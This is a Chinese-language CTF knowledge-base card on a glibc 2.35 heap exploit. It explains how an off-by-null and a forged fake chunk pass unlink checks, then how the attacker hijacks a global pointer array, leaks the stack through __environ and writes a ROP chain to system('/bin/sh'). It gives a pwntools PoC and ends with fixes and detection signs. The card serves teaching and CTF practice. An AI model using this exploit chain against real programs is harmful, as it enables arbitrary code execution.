---
id: binary-pwn-heap-glibc235-offby-null-unlink-chunks-array-stack-rop
title: glibc 2.35 off-by-null + 高版本 unlink：伪造 size/prev_size 通过检查，劫持全局 chunk 数组、__environ 泄露栈并 ROP
type: scenario
domain: binary
path: binary/pwn/heap
technique: glibc235-offby-null-unlink-chunks-array-stack-rop
tags:
- pwn
- heap
- unlink
- off-by-null
- glibc-2.35
- chunks-array
- environ
- stack-leak
- rop
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:35:30+08:00'
  notes: 已对照原文 2.35 题源码与 EXP 核对；卡片已注明 2.23 也有双向链表检查；原文未展示最终 flag；PoC 未复跑。
url: /docs/binary/pwn/heap/binary-pwn-heap-glibc235-offby-null-unlink-chunks-array-stack-rop/
draft: false
kb_aliases:
- 高版本 unlink
- 堆叠 unlink
- off-by-null unlink
- 2.35 unlink
- unlink 打栈
- 全局 chunk 数组劫持
- __environ 泄露栈
---

## 一句话结论

在 glibc 2.35 的 note 类堆题中，`edit` 的 0 字节溢出可以清掉下一个 chunk 的 `PREV_INUSE`；把 fake chunk 的 `size` 与其物理后继的 `prev_size` 伪造一致，并让 `fd/bk` 锚定到全局 chunk 指针数组（使 `FD->bk == P && BK->fd == P` 成立），free 时就能通过高版本 unlink 检查触发向后合并的 unlink，把全局数组改成指向自身附近的指针；再用这个任意指针把 `__environ` 当作 chunk 读出栈地址，把 chunk 指针改到栈上写入 ROP，最终 `system("/bin/sh")`。

## 原理

- **高版本 unlink 的检查差异**：glibc 2.23 的 `unlink` 宏只有双向链表一致性检查 `FD->bk == P && BK->fd == P`；2.27+ 在取 `fd/bk` 之前新增 `chunksize(P) != prev_size(next_chunk(P))` 检查，2.41 把宏改成 `unlink_chunk` 函数但检查仍在。largebin 范围的 chunk 还会检查 `fd_nextsize/bk_nextsize`；把 fake chunk 的 size 控制在 smallbin 范围可避开这部分。
- **free 的合并路径**：`free(p)` 在确认 `p` 不是 top、nextchunk 未越界、`prev_inuse(nextchunk)` 为真且 nextsize 合理后，若 `!prev_inuse(p)`，就用 `p->prev_size` 回退到前一个 chunk 并调用 `unlink`。因此要 unlink 一个 fake chunk，需要：被释放 chunk 的 `PREV_INUSE` 被清掉、其 `prev_size` 指向 fake chunk、fake chunk 的元数据能通过上述检查。
- **0 字节溢出来源**：`change_history` 里 `num = read(0, chunk[index], Size[index]); *(chunk[index] + num) = 0;`。当读满 `Size[index]` 字节时，这个 NUL 落在下一个 chunk 的 `size` 低字节，清掉 `PREV_INUSE`（并可能改小 size 的低位），形成 off-by-null。
- **通过 size vs prev_size 检查**：把 fake chunk 放在 chunk 0 的用户数据起点，写入 `prev_size=0`、`size=0xf1`（`chunksize` 掩码后为 0xf0）；fake chunk 的物理后继（chunk 1 头）的 `prev_size` 字段位于 fake+0xf0，写入 `0xf0`。这样 `chunksize(P)=0xf0 == prev_size(next_chunk(P))=0xf0`，检查通过。
- **通过 FD/BK 检查**：设 `target=0x4040C0`（全局 chunk 指针数组基址），`fd=target-0x18`、`bk=target-0x10`。因为 `*(target)` 原本保存着 `chunk[0]=P`，所以 `fd->bk` 和 `bk->fd` 都读到 `P`，双向链表检查通过。`unlink` 随后执行 `*(target)=bk`、再 `*(target)=fd`，最终 `chunk[0]` 变成 `target-0x18`/`target-0x10` 附近的指针。
- **为什么全局数组是关键**：数组位于固定 .bss（No PIE），且程序中 `edit/show` 把数组项当读写目标。让 `chunk[0]` 指向数组自身的稍前位置后，`edit(0, ...)` 就能改写数组项，把任意地址（如 `__environ`、栈地址）塞进数组，形成“指针数组 → 任意地址读写”的二级原语。
- **泄露链**：先释放大 chunk 进 unsorted bin，再申请较小 chunk 从 unsorted bin 切分，`show` 读出 main_arena 指针，减偏移 `0x21b1e0` 得 libc；再用释放块的 fd 泄露堆地址（原文 `-0xd10`）。把 `__environ` 写进 `chunk[0]` 后 `show(0)` 会打印 environ 的内容，即栈地址。
- **最终打栈**：`target = stack - 0x140`，用 `edit(1, p64(target))` 把 `chunk[0]` 改成该栈地址，再用 `edit(0, ROP)` 把 ROP 链写到栈上；链为 `pop rdi; "/bin/sh"; ret*3; system`，多个 `ret` 用于栈对齐。程序返回/退出时落到栈上的链，起 shell。

## 触发条件

- glibc 2.27+（原文环境 2.35）的 note/菜单类堆题，存在 add/delete/show/edit，`edit` 读满长度后多写一个 NUL（off-by-null），能清掉相邻 chunk 的 `PREV_INUSE`。
- No PIE（或已泄露代码基址），存在固定地址的全局 chunk 指针数组，且数组中保存着将被伪造的 chunk 的用户指针（用于通过 `FD->bk/BK->fd` 检查）；菜单用这些数组项作为 edit/show 的目的地址。
- 能泄露 libc（unsorted bin）与堆地址；能分配/释放足够多的 chunk 做 0x100 布局。
- 目标 chunk 的 free 能走到常规合并路径：若大小落在 tcache 范围，需要先释放 7 个同尺寸 chunk 填满 tcache（原文正是先释放 i+4 的 7 个 0xf0 chunk，再 free chunk 1）。
- fake chunk 的 size 保持在 smallbin 范围，避免 largebin 的 `fd_nextsize` 检查。

## 利用步骤

1. `checksec` 确认 No PIE；逆向菜单，确认 `edit` 的 0 字节溢出、全局 chunk 数组地址（原文 `0x4040C0`）与各 chunk 的 `Size` 记录。
2. 泄露 libc：申请 3 个 0x4f0 chunk，释放 chunk 0，申请 0x70 从 unsorted bin 切分，`show(0)` 读 fd，`libc = leak - 0x21b1e0`。
3. 恢复/调整堆布局并泄露堆地址：申请/释放若干 0x4f0 chunk，`show` 读释放块的 fd，`heap = leak - 0xd10`。
4. 布置 0xf8/0xf0 的相邻 chunk（chunk 0、chunk 1），再申请 7 个 0xf0 chunk 填充 tcache。
5. 构造 fake chunk 写入 chunk 0：`p64(0) + p64(0xf1) + p64(target-0x18) + p64(target-0x10)`，补到 0xf0，末尾追加 `p64(0xf0)`（下一个 chunk 的 prev_size）；`edit(0, pd)` 的 0 字节溢出清掉 chunk 1 的 `PREV_INUSE`。
6. 先 `delete` 7 个填充 chunk 占满 tcache，再 `delete(1)`，触发向后合并并 unlink fake chunk；全局数组被改写。
7. 用 `edit(0, ...)` 把 `__environ` 写入 `chunk[0]`、把 `0x4040C0` 写入 `chunk[1]`；`show(0)` 泄露栈地址 `stack`。
8. `target = stack - 0x140`；`edit(1, p64(target))` 把 `chunk[0]` 改成栈目标；`edit(0, ROP)` 写入 `pop rdi; /bin/sh; ret*3; system`；触发返回/退出拿 shell。

## PoC

原文关键片段（偏移/地址为原题示例，未在本机复跑）：

```python
from pwn import *

target = 0x4040C0          # 全局 chunk 指针数组
fd, bk = target - 0x18, target - 0x10

# 1) fake chunk：prev_size=0, size=0xf1；fd/bk 锚定全局数组
pd  = flat(0, 0xf1)
pd += flat(fd, bk)
pd  = pd.ljust(0xf0, b'\x00')
pd += p64(0xf0)            # 物理后继 chunk 的 prev_size
edit(0, pd)                # 读满 Size[0]=0xf8，0 字节溢出清 PREV_INUSE

# 2) 先填满 tcache，再 free chunk 1 触发 unlink
for i in range(7):
    delete(i + 4)
delete(1)

# 3) 改写全局数组：chunk[0]=__environ，show 泄露栈
pd  = p64(0) * 3
pd += p64(lib + libc.sym['__environ'])
pd += p64(0x4040C0)
pd += b'a' * 0x78
pd += p32(0x111111)
edit(0, pd)
show(0)
stack = u64(recv(6).ljust(8, b'\x00'))

# 4) 把 chunk[0] 指向栈并写入 ROP
target = stack - 0x140
edit(1, p64(target))
rop  = p64(lib + next(libc.search(asm('pop rdi; ret'))))
rop += p64(lib + next(libc.search(b'/bin/sh')))
rop += p64(0x40101a) * 3
rop += p64(lib + libc.sym['system'])
edit(0, rop)
```

要点：`pd` 的末尾 `p64(0xf0)` 必须落在 fake chunk 的物理后继的 `prev_size` 字段上，才能通过 `chunksize(P) == prev_size(next_chunk(P))`；`fd/bk` 的选择依赖 `*(target)` 原本等于 `P`（全局数组保存 `chunk[0]`），换题时要重新找锚点。

## 变体与关联

- 变体：2.23 没有 `chunksize(P) != prev_size(next_chunk(P))` 检查，fake chunk 构造更简单；2.27/2.35/2.41 都需要伪造 size 与后继 prev_size 一致。
- 变体：若全局数组中没有指向 P 的指针，可选择其他“内存中已有 P”的固定地址作为 `fd/bk` 锚点（如指向该 chunk 的全局变量、结构体字段）；核心是让 `FD->bk` 与 `BK->fd` 都读到 P。
- 变体：目标 chunk 落在 tcache 范围时，先填满 tcache 或改 size 使其走 unsorted/常规合并；否则 free 只进 tcache，不触发 unlink。
- 变体：unlink 后的二级原语不一定要打 `__environ`，也可打 GOT、`__free_hook`（版本允许时）、`_IO_list_all` 或返回地址。
- 关联：[[binary-pwn-heap-note-offbyone-unlink-house-of-some-iofile]]（同为 glibc 2.35 的 off-by-one + unlink，但后续走 House of Some/FSOP）；[[binary-pwn-heap-glibc223-unsafe-unlink-chunks-array-got-system]]（2.23 无 size/prev_size 检查的 unsafe unlink）；[[binary-pwn-heap-tcache-stashing-unlink-largebin-fake-chunk-arbitrary-write]]（tcache stashing + largebin fake chunk）；[[binary-pwn-heap-uaf-tcache-poison-global-environ-stack-rop]]（environ 泄露栈 + ROP）。
- 边界：原文把 2.23 说成“检查很少”，实际 2.23 同样有 `FD->bk == P && BK->fd == P` 检查，真正的版本差异是 2.27 新增的 size vs prev_size 检查；此外原文的 libc/堆偏移与 `0x4040C0` 均为原题值，换 libc/目标必须重算。

## 检测与防御

- 修复：`read` 长度改为 `Size[index]-1` 或读后检查 `num < Size[index]` 再写 NUL；对 chunk 索引、大小和释放状态做完整校验；free 后清空全局指针。
- 编译/运行：开启 PIE/ASLR 使全局数组与 chunk 地址不可预测；Full RELRO、Canary、NX；使用 safe-linking/tcache 只能提高门槛，不能替代边界检查。
- 检测：堆块 `size` 低字节被清零、`prev_size` 与相邻 size 不一致、`fd/bk` 指向 .bss 全局数组或自身附近、`__environ` 被当作 chunk 读取、栈地址出现在堆数据中、退出前出现 `system` ROP 链。
- CTF 排查：若 free 后没有触发 unlink，先确认 tcache 是否已满、size 是否落在 tcache 范围、`PREV_INUSE` 是否真的被清掉、fake chunk 的 size 与后继 prev_size 是否一致。
